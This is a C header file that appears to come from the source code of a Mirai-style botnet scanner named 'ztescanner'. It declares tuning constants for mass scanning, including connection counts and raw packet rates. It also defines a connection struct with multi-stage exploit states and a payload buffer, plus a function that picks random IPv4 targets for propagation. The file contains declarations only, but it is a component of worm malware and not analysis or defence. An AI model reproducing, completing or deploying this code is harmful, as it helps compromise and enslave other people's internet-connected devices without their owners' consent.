#pragma once

#include <stdint.h>

#include "includes.h"

#ifdef SCAN_MAX
#define ztescanner_SCANNER_MAX_CONNS 512
#define ztescanner_SCANNER_RAW_PPS 720
#else
#define ztescanner_SCANNER_MAX_CONNS 128
#define ztescanner_SCANNER_RAW_PPS 160
#endif

#ifdef SCAN_MAX
#define ztescanner_SCANNER_RDBUF_SIZE 1024
#define ztescanner_SCANNER_HACK_DRAIN 64
#else
#define ztescanner_SCANNER_RDBUF_SIZE 256
#define ztescanner_SCANNER_HACK_DRAIN 64
#endif

struct ztescanner_scanner_connection
{
    int fd, last_recv;
    enum
    {
        ztescanner_SC_CLOSED,
        ztescanner_SC_CONNECTING,
        ztescanner_SC_EXPLOIT_STAGE2,
        ztescanner_SC_EXPLOIT_STAGE3,
    } state;
    ipv4_t dst_addr;
    uint16_t dst_port;
    int rdbuf_pos;
    char rdbuf[ztescanner_SCANNER_RDBUF_SIZE];
    char payload_buf[1024];
};

void ztescanner_scanner_init(int);
void ztescanner_scanner_kill(int);

static void ztescanner_setup_connection(struct ztescanner_scanner_connection *);
static ipv4_t ztescanner_get_random_ip(void);
